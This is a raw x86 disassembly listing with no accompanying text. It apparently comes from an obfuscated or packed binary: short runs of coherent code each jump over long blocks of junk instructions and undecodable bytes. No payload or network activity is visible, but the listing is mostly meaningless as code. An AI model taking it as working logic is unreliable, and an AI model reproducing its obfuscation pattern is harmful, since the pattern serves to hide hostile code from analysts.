  427d02:	gs xchg bh,ah
  427d05:	xor    BYTE PTR [ecx-0x76e3dba4],cl
  427d0b:	inc    esp
  427d0c:	and    al,0x18
  427d0e:	jmp    0x427dee
  427d13:	adc    eax,0xa243a2b7
  427d18:	push   edi
  427d19:	cmc    
  427d1a:	test   DWORD PTR [ebx-0x9],0x8a0c024d
  427d21:	call   0x21991c5
  427d26:	add    bl,al
  427d28:	add    BYTE PTR [eax],al
  427d2a:	add    cl,al
  427d2c:	(bad)  
  427d2d:	in     eax,dx
  427d2e:	in     al,dx
  427d2f:	xchg   DWORD PTR [esi+0x13],ebx
  427d32:	push   cs
  427d33:	add    DWORD PTR [esi+0x53],eax
  427d36:	test   dh,0x94
  427d39:	mov    bh,0xb
  427d3b:	aam    0x50
  427d3d:	outs   dx,BYTE PTR ds:[esi]
  427d3e:	lds    esi,FWORD PTR [ebx]
  427d40:	xchg   BYTE PTR [edx-0x1debc744],ah
  427d46:	jmp    0x427ccf
  427d48:	and    ebx,edx
  427d4a:	push   ebp
  427d4b:	push   esp
  427d4c:	cmc    
  427d4d:	pop    esi
  427d4e:	cmp    BYTE PTR [edx-0x53],dl
  427d51:	jmp    0x427dc9
  427d53:	imul   edi,DWORD PTR [ecx+0x416b0517],0xffffffea
  427d5a:	inc    edx
  427d5b:	or     BYTE PTR [eax+0x28175fa1],cl
  427d61:	sbb    eax,0x7be077d9
  427d66:	jno    0x427d4b
  427d68:	out    dx,eax
  427d69:	ss sti 
  427d6b:	aad    0xef
  427d6d:	out    0x3,al
  427d6f:	dec    ebx
  427d70:	push   cs
  427d71:	adc    eax,0x33d75c5c
  427d76:	and    dl,cl
  427d78:	add    al,0x5b
  427d7a:	add    DWORD PTR [edx],eax
  427d7c:	cld    
  427d7d:	pop    ebp
  427d7e:	mov    eax,ds:0xe9c1bcbc
  427d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d84:	stc    
  427d85:	sub    BYTE PTR [esi],cl
  427d87:	sub    al,0x3d
  427d89:	mov    dl,0x36
  427d8b:	mov    ebx,DWORD PTR ds:0x5e648264
  427d91:	jl     0x427db9
  427d93:	ins    DWORD PTR es:[edi],dx
  427d94:	dec    edx
  427d95:	push   0xf3961bdb
  427d9a:	stc    
  427d9b:	mov    ?,WORD PTR [edi-0xd]
  427d9e:	out    0xad,al
  427da0:	repz and edi,DWORD PTR [ecx+0x18aae274]
  427da7:	push   cs
  427da8:	lods   al,BYTE PTR ds:[esi]
  427da9:	add    eax,0xbabc1557
  427dae:	lock and eax,0x8a31a4b
  427db4:	inc    edx
  427db5:	div    eax
  427db7:	stos   DWORD PTR es:[edi],eax
  427db8:	pop    ebx
  427db9:	sbb    al,0x93
  427dbb:	es je  0x427d48
  427dbe:	hlt    
  427dbf:	xor    al,0xb3
  427dc1:	or     dh,bh
  427dc3:	push   es
  427dc4:	dec    eax
  427dc5:	pop    ss
  427dc6:	mov    dl,BYTE PTR [edi-0x7e]
  427dc9:	hlt    
  427dca:	in     al,dx
  427dcb:	sub    ch,cl
  427dcd:	mov    ah,BYTE PTR [ebx-0x74]
  427dd0:	cmp    al,0x83
  427dd2:	dec    ebx
  427dd3:	add    dh,BYTE PTR [edi]
  427dd5:	leave  
  427dd6:	mov    ah,0x95
  427dd8:	in     al,dx
  427dd9:	pushf  
  427dda:	cld    
  427ddb:	xor    bh,ah
  427ddd:	xchg   ebx,eax
  427dde:	mov    esp,edi
  427de0:	push   eax
  427de1:	cmp    DWORD PTR [edx],0xc9f4eaa0
  427de7:	mov    esp,0xff113f12
  427dec:	stos   BYTE PTR es:[edi],al
  427ded:	lea    ax,[ebp+0x10]
  427df1:	mov    DWORD PTR ds:0x42f61c,0x40ba
  427dfb:	push   eax
  427dfc:	or     DWORD PTR ds:0x42f658,0x42f670
  427e06:	lea    eax,[ebp+0xc]
  427e09:	jmp    0x427ee9
  427e0e:	sub    eax,0x99eb19ac
  427e13:	(bad)  
  427e14:	(bad)  
  427e15:	out    dx,al
  427e16:	adc    eax,DWORD PTR [eax-0x6231f2ce]
  427e1c:	test   esi,ebx
  427e1e:	xlat   BYTE PTR ds:[ebx]
  427e1f:	xlat   BYTE PTR ds:[ebx]
  427e20:	add    DWORD PTR [eax],eax
  427e22:	ret    
  427e23:	add    BYTE PTR [eax],al
  427e25:	add    dl,al
  427e27:	cmp    ebx,DWORD PTR [esi]
  427e29:	push   ecx
  427e2a:	xchg   esi,eax
  427e2b:	jb     0x427e9a
  427e2d:	push   ebx
  427e2e:	or     al,0xe6
  427e30:	retf   0xf598
  427e33:	jns    0x427e62
  427e35:	test   DWORD PTR [edx+ecx*8-0x1d],edx
  427e39:	jmp    0x427dcb
  427e3b:	push   0xffffffc7
  427e3d:	add    al,0x24
  427e3f:	inc    ecx
  427e40:	mov    dh,0xce
  427e42:	jl     0x427e65
  427e44:	mov    ds:0xdb73b731,al
  427e49:	pop    eax
  427e4a:	add    ebx,DWORD PTR [edi-0x8]
  427e4d:	rcr    BYTE PTR [eax+eiz*4],cl
  427e50:	aad    0xdf
  427e52:	iret   
  427e53:	ret    
  427e54:	imul   ebx,DWORD PTR [ebp-0x71],0x65
  427e58:	je     0x427e76
  427e5a:	ja     0x427e36
  427e5c:	pop    ds
  427e5d:	and    dh,BYTE PTR [edi-0x7cf76254]
  427e63:	ror    DWORD PTR [ebx+edx*4+0xe],cl
  427e67:	inc    ebx
  427e68:	xchg   DWORD PTR [esi],edi
  427e6a:	mov    cl,0xc7
  427e6c:	and    DWORD PTR [edi+0x1f],eax
  427e6f:	push   eax
  427e70:	cmc    
  427e71:	in     eax,0x76
  427e73:	not    BYTE PTR [edi]
  427e75:	mov    ds:0xe2b0e8d7,eax
  427e7a:	adc    eax,0x30733138
  427e7f:	rcr    BYTE PTR [edx+0x45],0xf6
  427e83:	add    al,0x90
  427e85:	inc    esi
  427e86:	int    0xe
  427e88:	add    eax,DWORD PTR [edx]
  427e8a:	push   es
  427e8b:	and    edi,DWORD PTR [ebp+0x325d44e8]
  427e91:	adc    DWORD PTR [ebx-0x4bf25887],esp
  427e97:	adc    bl,BYTE PTR [ebx+0x6aaee5af]
  427e9d:	test   eax,0x78c39740
  427ea2:	mov    bh,0xc4
  427ea4:	mov    edx,0xdbb8f539
  427ea9:	(bad)  
  427eaa:	jo     0x427e89
  427eac:	push   ss
  427ead:	add    bh,bl
  427eaf:	dec    edx
  427eb0:	xchg   ebp,eax
  427eb1:	fucomp st(4)
  427eb3:	adc    DWORD PTR [ebp+eiz*8+0x1],0xffffffd2
  427eb8:	mov    esi,0x336dcfd6
  427ebd:	cmp    DWORD PTR [esi-0x2b],ebp
  427ec0:	rcl    BYTE PTR [ebx],1
  427ec2:	inc    edx
  427ec3:	gs js  0x427e98
  427ec6:	inc    edi
  427ec7:	push   edx
  427ec8:	ret    0x8bee
  427ecb:	inc    esi
  427ecc:	mov    dl,0x86
  427ece:	ins    DWORD PTR es:[edi],dx
  427ecf:	lahf   
  427ed0:	fmulp  st(3),st
  427ed2:	mov    edi,0x4427a07f
  427ed7:	adc    eax,0x9c9910e9
  427edc:	loop   0x427f5c
  427ede:	stos   DWORD PTR es:[edi],eax
  427edf:	dec    ebx
  427ee0:	sar    BYTE PTR [edi+0x533b1435],0x6
  427ee7:	mov    bh,0xb4
  427ee9:	push   eax
  427eea:	jmp    0x427fca
  427eef:	jo     0x427f52
  427ef1:	cmp    eax,0x747d3d39
  427ef6:	imul   ebp,DWORD PTR [eax+ebx*1],0xde4cbb79
  427efd:	push   cs
  427efe:	mov    eax,ds:0x1d89a
  427f03:	ret    
  427f04:	add    BYTE PTR [eax],al
  427f06:	add    al,ah
  427f08:	(bad)  
  427f09:	cmp    edi,DWORD PTR [esi+ebx*1-0x2f]
  427f0d:	jmp    0x28ee5593
  427f12:	sbb    eax,0x9fb2b345
  427f17:	add    ah,al
  427f19:	and    ch,al
  427f1b:	mov    eax,gs
  427f1d:	xchg   ebx,eax
  427f1e:	add    esi,ecx
  427f20:	scas   al,BYTE PTR es:[edi]
  427f21:	jle    0x427ec5
  427f23:	jp     0x427f4d
  427f25:	out    dx,al
  427f26:	adc    BYTE PTR [ecx+0x71],0x41
  427f2a:	aad    0x7f
  427f2c:	test   eax,0x6a8fca5b
  427f31:	sbb    esi,esp
  427f33:	or     eax,0xfa3fc0f2
  427f38:	xchg   esp,eax
  427f39:	jg     0x427f6b
  427f3b:	js     0x427f68
  427f3d:	clc    
  427f3e:	call   0x251e:0x5f680030
  427f45:	mov    dl,0x6d
  427f47:	jb     0x427eca
  427f49:	repnz bound edi,QWORD PTR [ecx+0x1e]
  427f4d:	inc    edi
  427f4e:	push   esi
  427f4f:	push   esi
  427f50:	das    
  427f51:	iret   
  427f52:	ds stos BYTE PTR es:[edi],al
  427f54:	out    0xe9,al
  427f56:	imul   eax,ebx,0x872efc15
  427f5c:	je     0x427f35
  427f5e:	push   cs
  427f5f:	mov    ds:0x60413b1,eax
  427f64:	nop
  427f65:	cmp    esp,esp
  427f67:	adc    esi,esp
  427f69:	aad    0x81
  427f6b:	jl     0x427f2c
  427f6d:	jge    0x427f17
  427f6f:	rcr    DWORD PTR [ebx+edx*4-0x36],1
  427f73:	mov    dl,BYTE PTR [esi+0x2d]
  427f76:	daa    
  427f77:	and    dh,BYTE PTR ds:[edi-0x15]
  427f7b:	outs   dx,BYTE PTR ds:[esi]
  427f7c:	pusha  
  427f7d:	pop    eax
  427f7e:	cmp    DWORD PTR [ecx-0x2d],eax
  427f81:	jbe    0x427fee
  427f83:	data16 fcmovu st,st(4)
  427f86:	push   esi
  427f87:	fmul   QWORD PTR [ebx-0x29]
  427f8a:	mov    ebx,0xe909f9a
  427f8f:	mov    DWORD PTR [ebx+eax*8],ebx
  427f92:	inc    ecx
  427f93:	clc    
  427f94:	xchg   BYTE PTR [edx+0xe],cl
  427f97:	push   ecx
  427f98:	jmp    0x410d7c90
  427f9d:	cld    
  427f9e:	jbe    0x427fb8
  427fa0:	mov    dh,0x5
  427fa2:	mov    bl,0xb2
  427fa4:	retf   0xc1ca
  427fa7:	dec    esi
  427fa8:	(bad)  
  427fa9:	fbld   TBYTE PTR ds:[edi+0x1ed00b0b]
  427fb0:	test   BYTE PTR [edi+0x4a0e2c37],dh
  427fb6:	mov    eax,ds:0x811ffc49
  427fbb:	loop   0x427fea
  427fbd:	jae    0x427ffa
  427fbf:	shl    edi,1
  427fc1:	outs   dx,DWORD PTR ds:[esi]
  427fc2:	jg     0x427f45
  427fc4:	retf   
  427fc5:	jae    0x428005
  427fc7:	fwait
  427fc8:	sub    al,0x42
  427fca:	lea    eax,[ebp+0x8]
  427fcd:	and    DWORD PTR ds:0x42f53c,0x42f600
  427fd7:	jmp    0x4280b7
  427fdc:	rol    BYTE PTR [ecx],cl
  427fde:	jns    0x427f7e
  427fe0:	sti    
  427fe1:	(bad)  
  427fe2:	test   DWORD PTR [ebp-0x44],0x5374b9ab
  427fe9:	mov    ds:0xd95d022d,al
  427fee:	add    DWORD PTR [eax],eax
  427ff0:	ret    
  427ff1:	add    BYTE PTR [eax],al
  427ff3:	add    BYTE PTR [edi],cl
  427ff5:	ds xchg ecx,eax
  427ff7:	sub    edi,DWORD PTR [edx-0x3999ab82]
  427ffd:	cmp    esp,esi
  427fff:	pusha  
  428000:	mov    edx,0xbb3488bb
  428005:	stos   DWORD PTR es:[edi],eax
  428006:	sub    al,0xc7
  428008:	js     0x428053
  42800a:	sub    ebp,0x9e4ee1b9
  428010:	aad    0xde
  428012:	jecxz  0x428052
  428014:	out    dx,eax
  428015:	adc    eax,0x5d7b208d
  42801a:	pushf  
  42801b:	mov    eax,0xa4fb57de
  428020:	jle    0x428006
  428022:	rol    BYTE PTR [edx-0x33],1
  428025:	fmul   st,st(7)
  428027:	aad    0x25
  428029:	dec    esp
  42802a:	icebp  
  42802b:	(bad)  
  42802c:	test   DWORD PTR [ecx+0x3fa07eb2],edi
  428032:	fldcw  WORD PTR [esi-0x7c2f07d0]
  428038:	iret   
  428039:	lods   eax,DWORD PTR ds:[esi]
  42803a:	fmul   st(4),st
  42803c:	hlt    
  42803d:	mov    ebp,0x9e1d8a39
  428042:	test   eax,0xc5058b7a
  428047:	sbb    BYTE PTR [ebp-0xf],al
  42804a:	pop    ebp
  42804b:	xchg   esi,eax
  42804c:	cld    
  42804d:	sub    al,0xd6
  42804f:	rcr    BYTE PTR [ebx-0x55],cl
  428052:	fdiv   DWORD PTR [ebp+0x7e]
  428055:	mov    BYTE PTR [edx],ch
  428057:	or     BYTE PTR ds:0x5b1123b0,dl
  42805d:	mov    ecx,0x64f49fc4
  428062:	imul   ebp,DWORD PTR [ecx+0x70fc714b],0xffffffd0
  428069:	add    eax,0xdb61aad7
  42806e:	xchg   edi,eax
  42806f:	retf   
  428070:	mov    eax,0x18418698
  428075:	xchg   ebp,eax
  428076:	aas    
  428077:	dec    esp
  428078:	jae    0x4280a4
  42807a:	jae    0x4280bf
  42807c:	(bad)  
  42807d:	jl     0x428032
  42807f:	aaa    
  428080:	popa   
  428081:	jg     0x42809f
  428083:	cmp    BYTE PTR [esi+0x9],ch
  428086:	mov    ch,0x33
  428088:	call   FWORD PTR [ecx+0x58]
  42808b:	xlat   BYTE PTR ds:[ebx]
  42808c:	add    al,0xae
  42808e:	xchg   esp,eax
  42808f:	cmp    cl,BYTE PTR [ecx+0x5dd0d58a]
  428095:	cld    
  428096:	lds    edi,FWORD PTR [edx]
  428098:	inc    eax
  428099:	cdq    
  42809a:	data16 ds es sbb al,0x6d
  42809f:	mov    bl,0x97
  4280a1:	mov    ebx,0x942c3151
  4280a6:	xchg   esp,eax
  4280a7:	cmp    BYTE PTR fs:[edx],al
  4280aa:	pop    ebx
  4280ab:	paddusw mm2,mm0
  4280ae:	imul   edx,DWORD PTR [esi-0x5a],0x1eedfe7b
  4280b5:	mov    bh,0x72
  4280b7:	mov    DWORD PTR [esp+0x24],ebx
  4280bb:	adc    DWORD PTR ds:0x42f670,0x18c1
  4280c5:	push   eax
  4280c6:	call   0x40ac21
  4280cb:	add    DWORD PTR ds:0x42f5bc,0x2b25
  4280d5:	push   0x4
  4280d7:	add    DWORD PTR ds:0x42f530,0x42f5c4
  4280e1:	jmp    0x4281c1
  4280e6:	xchg   edx,eax
  4280e7:	push   ss
  4280e8:	cmp    ch,ch
  4280ea:	mov    esi,0x2e7fd7ed
  4280ef:	sahf   
  4280f0:	jnp    0x4280d6
  4280f2:	sub    ebp,0xda20da2c
  4280f8:	add    DWORD PTR [eax],eax
  4280fa:	ret    
  4280fb:	add    BYTE PTR [eax],al
  4280fd:	add    BYTE PTR [edx-0x6b7bc386],dh
  428103:	test   eax,0xb50b1459
  428108:	xchg   edi,eax
  428109:	mov    ds:0x6193dcbd,al
  42810e:	(bad)  
  428110:	jo     0x428104
  428112:	sub    ch,dh
  428114:	dec    esi
  428115:	sbb    dl,BYTE PTR [edx]
  428117:	and    BYTE PTR [ebx-0x7],0x42
  42811b:	xchg   esi,eax
  42811c:	cmove  edx,DWORD PTR [ebp+ecx*4-0x4f97bc59]
  428124:	jg     0x4280ce
  428126:	mov    ds:0x925bb2e,eax
  42812b:	push   ecx
  42812c:	in     al,0xf4
  42812e:	inc    BYTE PTR [esi]
  428130:	sbb    al,0xd9
  428132:	fwait
  428133:	or     ebx,DWORD PTR [edx]
  428135:	pop    ds
  428136:	pusha  
  428137:	in     eax,dx
  428138:	mov    ecx,0x4aa72da3
  42813d:	int    0xe5
  42813f:	stc    
  428140:	mov    dl,0x93
  428142:	sbb    dl,BYTE PTR [ecx+0x470b8804]
  428148:	cmp    al,0x3c
  42814a:	shl    ecx,cl
  42814c:	sub    BYTE PTR [edx],bl
  42814e:	imul   eax,DWORD PTR [ebp+0x2d],0xffffff81
  428152:	call   0xcaec:0x685567bb
  428159:	or     ebx,edx
  42815b:	daa    
  42815c:	jg     0x428158
  42815e:	popa   
  42815f:	cmp    DWORD PTR [eax-0x231ea9d9],ecx
  428165:	mov    bh,0x98
  428167:	js     0x428118
  428169:	pop    ss
  42816a:	xchg   ebx,eax
  42816b:	(bad)  
  42816c:	xor    DWORD PTR [eax+eiz*8-0x66],ebx
  428170:	aaa    
  428171:	sub    BYTE PTR [edx],0xa9
  428174:	fwait
  428175:	lahf   
  428176:	dec    esi
  428177:	repnz xor eax,0x39f28e8a
  42817d:	mov    ds:0x982c0d99,al
  428182:	int3   
  428183:	test   al,0x45
  428185:	nop
  428186:	pop    edx
  428187:	adc    eax,DWORD PTR [eax+0x34edc01a]
  42818d:	ja     0x4281ba
  42818f:	ins    BYTE PTR es:[edi],dx
  428190:	imul   edi,DWORD PTR [ebp-0x4c],0x4c
  428194:	fst    QWORD PTR [ecx+0x6daf67e3]
  42819a:	mov    al,ds:0x6e06a8d8
  42819f:	int3   
  4281a0:	(bad)  
  4281a1:	jg     0x428178
  4281a3:	mov    DWORD PTR [esi+0x35],esp
  4281a6:	dec    ebp
  4281a7:	or     ch,BYTE PTR [ebx+0x2f]
  4281aa:	mov    eax,ds:0x3aa14d06
  4281af:	cmp    ah,bl
  4281b1:	pop    ds
  4281b2:	lods   al,BYTE PTR ds:[esi]
  4281b3:	jbe    0x428177
  4281b5:	xchg   ebp,eax
  4281b6:	mul    BYTE PTR [edi+0x8]
  4281b9:	mov    ebx,0x3f772d16
  4281be:	int    0xdc
  4281c0:	or     ebp,DWORD PTR [eax+0x38]
  4281c3:	lock inc edx
  4281c5:	add    BYTE PTR [ecx+0x42f5801d],al
  4281cb:	add    BYTE PTR [ebp+esi*8+0x74ff0042],ch
  4281d2:	and    al,0x28
  4281d4:	mov    DWORD PTR ds:0x42f670,0xecc
  4281de:	call   0x41d107
  4281e3:	mov    eax,DWORD PTR [esp+0x20]
  4281e7:	movzx  ecx,WORD PTR ds:0x42f674
  4281ee:	or     ecx,DWORD PTR ds:0x42f550
  4281f4:	mov    DWORD PTR ds:0x42f674,ecx
  4281fa:	mov    ecx,DWORD PTR [eax]
  4281fc:	xor    eax,0x22f7
  428201:	mov    eax,DWORD PTR [esp+0x20]
  428205:	mov    edx,DWORD PTR [eax]
  428207:	sbb    eax,0x7c33
  42820c:	add    ecx,0x7511
  428212:	cmp    DWORD PTR ds:0x42f65c,0x0
  428219:	jb     0x428234
  42821f:	jmp    0x428234
  428224:	push   0x7389
  428229:	push   0x38c2
  42822e:	call   DWORD PTR ds:0x4387a0
  428234:	shl    ecx,0x10
  428237:	mov    eax,0x3cf87511
  42823c:	add    edx,eax
  42823e:	jmp    0x42831e
  428243:	imul   esi,DWORD PTR [ebx],0x67
  428246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428247:	jg     0x42823e
  428249:	jmp    0x42824a
  42824b:	js     0x42828b
  42824d:	shl    BYTE PTR [ecx-0x6a0e108a],0xe3
  428254:	fiadd  DWORD PTR [ecx]
  428256:	add    bl,al
  428258:	add    BYTE PTR [eax],al
  42825a:	add    BYTE PTR [edx-0x38],cl
  42825d:	mov    al,BYTE PTR [eax+0x64cf2530]
  428263:	int3   
  428264:	pop    esi
  428265:	enter  0x5031,0x58
  428269:	jmp    0x4951:0xbfe4d902
  428270:	jno    0x428210
  428272:	push   esi
  428273:	push   ebx
  428274:	sbb    ah,BYTE PTR [eax+0x112eca87]
  42827a:	iret   
  42827b:	dec    ebx
  42827c:	sub    ebp,eax
  42827e:	call   0xbf2ada62
  428283:	fidiv  WORD PTR [ebp+0x60]
  428286:	or     bl,BYTE PTR [edx+0x28469b07]
  42828c:	imul   ecx,DWORD PTR [eax],0xffffffb9
  42828f:	test   ebp,0x815088a0
  428295:	pop    edi
  428296:	inc    edi
  428297:	xchg   ecx,eax
  428298:	push   ebx
  428299:	jbe    0x428273
  42829b:	xchg   cl,dl
  42829d:	lock loopne 0x428314
  4282a0:	icebp  
  4282a1:	jae    0x428239
  4282a3:	ss or  al,0xfe
  4282a6:	jl     0x428327
  4282a8:	retf   0x72ab
  4282ab:	int3   
  4282ac:	pop    ecx
  4282ad:	jmp    0xc76c:0xb1f9a468
  4282b4:	retf   
  4282b5:	scas   eax,DWORD PTR es:[edi]
  4282b6:	test   eax,0x19c90752
  4282bb:	ror    dl,0x33
  4282be:	test   eax,0x98b70da1
  4282c3:	xor    DWORD PTR [edi],ebx
  4282c5:	or     edi,ecx
  4282c7:	push   edi
  4282c8:	jl     0x428286
  4282ca:	push   eax
  4282cb:	aad    0xf5
  4282cd:	ds sahf 
  4282cf:	repnz mov ebp,0xdc9d17a4
  4282d5:	or     eax,0x23025faa
  4282da:	jo     0x428278
  4282dc:	mov    bh,0xbc
  4282de:	push   cs
  4282df:	and    edx,0x4c56dc5b
  4282e5:	retf   
  4282e6:	lods   eax,DWORD PTR ds:[esi]
  4282e7:	push   cs
  4282e8:	cwde   
  4282e9:	xchg   ebp,eax
  4282ea:	das    
  4282eb:	aas    
  4282ec:	mov    edx,0x1a4e5fa5
  4282f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4282f2:	je     0x428350
  4282f4:	int3   
  4282f5:	rol    BYTE PTR [edi+esi*4+0x3c],1
  4282f9:	stc    
  4282fa:	ja     0x428358
  4282fc:	sub    ebp,DWORD PTR [ebx]
  4282fe:	loopne 0x42830f
  428300:	and    BYTE PTR [ebx-0x5e],ah
  428303:	lea    ebp,[eax]
  428305:	pop    es
  428306:	and    al,0x33
  428308:	lds    edx,FWORD PTR [ecx]
  42830a:	inc    ecx
  42830b:	ffreep st(6)
  42830d:	xor    esi,DWORD PTR [esp+eax*1-0x3]
  428311:	and    DWORD PTR [eax+edi*2-0x275196c5],ebp
  428318:	and    al,0xa3
  42831a:	jne    0x42831a
  42831c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42831d:	vpminsw xmm2,xmm7,XMMWORD PTR [eax]
  428321:	or     ecx,edx
  428323:	xor    ecx,0x78e259c9
  428329:	add    ecx,eax
  42832b:	sub    DWORD PTR ds:0x42f5e8,ecx
  428331:	mov    eax,DWORD PTR [esp+0x20]
  428335:	mov    edx,DWORD PTR ds:0x42f53c
  42833b:	xor    DWORD PTR ds:0x42f594,edx
  428341:	mov    DWORD PTR [eax],ecx
  428343:	xor    DWORD PTR ds:0x42f63c,ebx
  428349:	lea    eax,[esp+0x44]
  42834d:	neg    ecx
  42834f:	mov    DWORD PTR [esp+0x6c],eax
  428353:	and    DWORD PTR ds:0x42f560,ecx
  428359:	lea    eax,[esp+0x6c]
  42835d:	and    edx,edx
  42835f:	jmp    0x42843f
  428364:	cmp    dl,al
  428366:	mul    DWORD PTR [eax-0x1]
  428369:	addr16 mov edi,0xf6a7aada
  42836f:	pop    edi
  428370:	lahf   
  428371:	shr    BYTE PTR [esi+0x1dba6a1],cl
  428377:	add    bl,al
  428379:	add    BYTE PTR [eax],al
  42837b:	add    BYTE PTR [esi+ecx*1-0x45],bl
  42837f:	jns    0x42838c
  428381:	sub    BYTE PTR [edi],bh
  428383:	pop    ds
  428384:	xor    DWORD PTR [ebx-0x30],eax
  428387:	push   edi
  428388:	std    
  428389:	mov    al,ds:0xfde048dd
  42838e:	imul   esp,DWORD PTR [ecx+ecx*1+0x75749f06],0xb
  428396:	push   ebp
  428397:	cwde   
  428398:	rol    edx,1
  42839a:	sbb    DWORD PTR [esi+0x3b103865],edx
  4283a0:	add    DWORD PTR [ebx],esi
  4283a2:	out    0xa0,al
  4283a4:	sub    eax,0x3ff7c7b
  4283a9:	js     0x428402
  4283ab:	inc    esi
  4283ac:	dec    ebx
  4283ad:	jne    0x42838f
  4283af:	mov    eax,DWORD PTR [esi+0x7e]
  4283b2:	add    ebp,esp
  4283b4:	or     BYTE PTR ds:0x17cb6fa7,ch
  4283ba:	int3   
  4283bb:	fsub   st(6),st
  4283bd:	adc    al,0xd3
  4283bf:	jo     0x4283b6
  4283c1:	dec    edi
  4283c2:	pop    ss
  4283c3:	xor    ah,BYTE PTR [edi-0x2c058cec]
  4283c9:	adc    DWORD PTR [edi-0x12],ebp
  4283cc:	mov    ecx,esi
  4283ce:	inc    eax
  4283cf:	fs pop edx
  4283d1:	mov    ss,WORD PTR [edi+0x25]
  4283d4:	jle    0x428357
  4283d6:	mov    ah,0xa9
  4283d8:	bound  esi,QWORD PTR ds:0xc58f5e0f
  4283de:	clc    
  4283df:	jnp    0x42841f
  4283e1:	addr16 or edi,esp
  4283e4:	daa    
  4283e5:	jne    0x4283da
  4283e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283e8:	das    
  4283e9:	xchg   esp,eax
  4283ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283eb:	push   edx
  4283ec:	int    0xf0
  4283ee:	lahf   
  4283ef:	ds cli 
  4283f1:	stc    
  4283f2:	and    ebx,eax
  4283f4:	out    0x45,eax
  4283f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283f7:	repnz std 
  4283f9:	(bad)  [esi]
  4283fb:	stos   DWORD PTR es:[edi],eax
  4283fc:	adc    eax,0xb437ae09
  428401:	nop
  428402:	sub    al,0xae
  428404:	dec    eax
  428405:	xchg   ebx,eax
  428406:	adc    eax,0x9aaea712
  42840b:	gs jnp 0x428432
  42840e:	inc    edx
  42840f:	inc    ebx
  428410:	adc    esp,edi
  428412:	pop    eax
  428413:	adc    BYTE PTR [edx-0x5d],0x8c
  428417:	jne    0x42848b
  428419:	sub    cl,BYTE PTR [ebp+0x3a9883d5]
  42841f:	loope  0x428499
  428421:	lock xor BYTE PTR [ebx-0x7c74e0b0],al
  428428:	popf   
  428429:	lods   al,BYTE PTR ds:[esi]
  42842a:	rcl    DWORD PTR [ebp-0xc],0xde
  42842e:	fcom   st(0)
  428430:	mov    ecx,0x2025e0a5
  428435:	xor    cl,BYTE PTR [ebx]
  428437:	std    
  428438:	jae    0x428410
  42843a:	aaa    
  42843b:	pop    ds
  42843c:	sar    esp,1
  42843e:	jno    0x4283c9
  428440:	inc    esp
  428441:	and    al,0x74
  428443:	mov    eax,DWORD PTR [esp+0x10]
  428447:	adc    edx,0x76ef
  42844d:	mov    ecx,DWORD PTR [esp+0x14]
  428451:	add    DWORD PTR ds:0x42f5ac,0x1824
  42845b:	xor    eax,esi
  42845d:	or     DWORD PTR ds:0x42f664,0xe2
  428467:	jmp    0x428547
  42846c:	jno    0x428402
  42846e:	dec    edx
  42846f:	nop
  428470:	out    dx,eax
  428471:	fdivp  st(3),st
  428473:	cmc    
  428474:	push   eax
  428475:	stos   BYTE PTR es:[edi],al
  428476:	sub    eax,0xfa80d50d
  42847b:	pop    edi
  42847c:	imul   ebx,esp,0xc30001
  428482:	add    BYTE PTR [eax],al
  428484:	into   
  428485:	dec    edi
  428486:	push   es
  428487:	push   ecx
  428488:	pop    edi
  428489:	xchg   BYTE PTR es:[ebx+0x4c],cl
  42848d:	repnz xabort 0x2a
  428491:	jo     0x4284f7
  428493:	jmp    0x42841d
  428495:	push   edi
  428496:	lahf   
  428497:	aaa    
  428498:	xlat   BYTE PTR ds:[ebx]
  428499:	adc    ah,BYTE PTR gs:[ebp+0x7084f33]
  4284a0:	xor    al,0x61
  4284a2:	dec    ecx
  4284a3:	mov    ebx,0x13ea9bee
  4284a8:	dec    esi
  4284a9:	out    dx,al
  4284aa:	stc    
  4284ab:	adc    edx,DWORD PTR [ebx-0x7a7f8bda]
  4284b1:	and    BYTE PTR [edx],dl
  4284b3:	in     al,dx
  4284b4:	lea    ebp,[esi-0x7468dfa0]
  4284ba:	imul   eax,DWORD PTR [ebx-0x52],0x1d04a263
  4284c1:	test   al,0x42
  4284c3:	sbb    al,0x15
  4284c5:	out    dx,al
  4284c6:	iret   
  4284c7:	push   edi
  4284c8:	test   al,0xd6
  4284ca:	xor    cl,BYTE PTR [esi]
  4284cc:	pop    esp
  4284cd:	jbe    0x4284dd
  4284cf:	mov    cl,0x2d
  4284d1:	add    DWORD PTR [ebx],0x58
  4284d4:	loope  0x428542
  4284d6:	adc    WORD PTR [esi+edi*2+0x71648155],sp
  4284de:	xor    BYTE PTR [eax-0x5dc336a7],dh
  4284e4:	(bad)  
  4284e5:	retf   0xd8f5
  4284e8:	push   0x6eab4895
  4284ed:	out    0x68,al
  4284ef:	mov    al,ds:0x2de6a86f
  4284f4:	into   
  4284f5:	ss jb  0x4284ac
  4284f8:	or     al,0x34
  4284fa:	mov    cl,0x1b
  4284fc:	dec    eax
  4284fd:	push   edx
  4284fe:	(bad)  
  4284ff:	lahf   
  428500:	call   0x9bfc:0xdfeea168
  428507:	mov    ds:0x15b85adf,eax
  42850c:	sar    edx,0xfc
  42850f:	sbb    eax,0xeecdccdc
  428514:	xchg   ecx,eax
  428515:	(bad)  
  428516:	pop    edi
  428517:	push   cs
  428518:	dec    edx
  428519:	inc    ebp
  42851a:	mov    esp,0x998525b1
  42851f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428520:	aad    0xee
  428522:	int3   
  428523:	(bad)  
  428525:	cli    
  428526:	jne    0x42852c
  428528:	je     0x4284d1
  42852a:	push   eax
  42852b:	mov    ebx,0x9b056f8
  428530:	mov    ds:0xe54fdeb7,al
  428535:	adc    DWORD PTR [ebx],0xfffffff3
  428538:	add    BYTE PTR [eax+0xf],dl
  42853b:	push   ebp
  42853c:	or     esp,edx
  42853e:	or     BYTE PTR [ebx-0x6a],0x2a
  428542:	push   es
  428543:	sbb    eax,0x2b254e2f
  428548:	(bad)  
  428549:	mov    DWORD PTR [esp+0x44],eax
  42854d:	lea    eax,[ebp+0x4]
  428550:	xor    ecx,0x2e25
  428556:	or     DWORD PTR [esp+0x44],eax
  42855a:	mov    eax,0x5df3
  42855f:	movzx  edx,BYTE PTR ds:0x42f5c4
  428566:	or     DWORD PTR ds:0x42f5fc,edx
